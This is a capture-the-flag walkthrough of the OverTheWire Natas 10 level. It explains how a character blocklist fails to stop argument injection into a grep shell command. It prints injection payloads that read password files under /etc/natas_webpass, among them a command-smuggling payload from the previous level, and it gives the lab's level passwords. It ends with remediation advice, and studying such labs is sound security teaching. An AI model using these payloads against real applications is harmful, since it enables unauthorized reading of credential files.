# Natas 10

## What This Level Teaches

This level builds on command injection, but adds **input filtering**.

The main lesson is:

> **Blocking a few dangerous characters does not automatically make shell usage safe.**

Even when characters like `;`, `|`, and `&` are blocked, user input may still change how a command behaves.

---

## Goal

Find the password for **`natas11`**.

## Login

- **URL:** `http://natas10.natas.labs.overthewire.org`
- **Username:** `natas10`
- **Password:** `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`

---

## Walkthrough

### 1. Open the Natas 10 Page

Go to:

```text
http://natas10.natas.labs.overthewire.org
```

Log in with the username and password above.

The page looks similar to Natas 9. It has a search form that searches a dictionary.

### 2. View the Source Code

Open the source code.

The important part looks similar to this:

```php
if(preg_match('/[;|&]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

The application blocks these characters:

```text
; | &
```

That means the Natas 9 payload no longer works:

```text
; cat /etc/natas_webpass/natas11 #
```

We cannot use `;` to start a second command.

### 3. Use `grep` Against the Password File

Even though we cannot start a new command, our input is still placed inside the `grep` command.

The command is built like this:

```bash
grep -i USER_INPUT dictionary.txt
```

If we provide more than one word, the shell treats those words as separate arguments.

Submit:

```text
.* /etc/natas_webpass/natas11
```

The command becomes similar to:

```bash
grep -i .* /etc/natas_webpass/natas11 dictionary.txt
```

This tells `grep` to search for the pattern `.*` in both:

```text
/etc/natas_webpass/natas11
dictionary.txt
```

### 4. Read the Password

The pattern `.*` is a regular expression that matches almost any line.

Because the password file contains a line of text, `grep` prints it.

The password for Natas 11 is:

```text
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```

---

## How Did We Know This Still Worked?

The source code blocks command separators, but it still inserts user input into a shell command.

The reasoning is:

1. `;`, `|`, and `&` are blocked.
2. We cannot use the same command injection as Natas 9.
3. The input still becomes part of the `grep` command.
4. Shells split commands into arguments using spaces.
5. `grep` can accept multiple files to search.
6. We can add `/etc/natas_webpass/natas11` as another file argument.
7. A broad pattern like `.*` makes `grep` print the password line.

---

## What Is Input Filtering?

Input filtering means checking user input and rejecting values that contain unwanted characters or patterns.

In this level, the filter rejects:

```text
; | &
```

That blocks some common shell injection tricks, but it does not solve the deeper issue: the program still builds a shell command using raw user input.

Filtering can help, but it must be designed around the actual risk.

---

## What Is a Regular Expression?

A regular expression, often shortened to regex, is a pattern used for matching text.

In this level, the pattern is:

```text
.*
```

The `.` means "any character."

The `*` means "zero or more of the previous thing."

Together, `.*` matches almost any line.

That makes it useful here because we do not need to know what the password starts with.

---

## Why the Natas 9 Payload Fails

This payload worked in Natas 9:

```text
; cat /etc/natas_webpass/natas10 #
```

In Natas 10, the `;` is blocked.

Without `;`, we cannot end the `grep` command and start `cat`.

Instead of trying to run a second command, we make the existing `grep` command read the password file.

---

## Security Lesson

Blocking a few characters is not enough when user input is placed into a shell command.

Safer approaches include:

- Avoid shell commands when possible.
- Use built-in language features instead of `grep`.
- Pass arguments safely without invoking a shell.
- Use strict allowlists for expected input.

The safest fix is to avoid building shell commands from user input.

---

## Key Takeaways

- Natas 10 blocks `;`, `|`, and `&`.
- Blocking those characters prevents the exact Natas 9 payload.
- The input still affects the arguments passed to `grep`.
- `grep` can search multiple files.
- `.*` is a regex pattern that matches almost any line.
- Filtering dangerous characters is not the same as secure command handling.
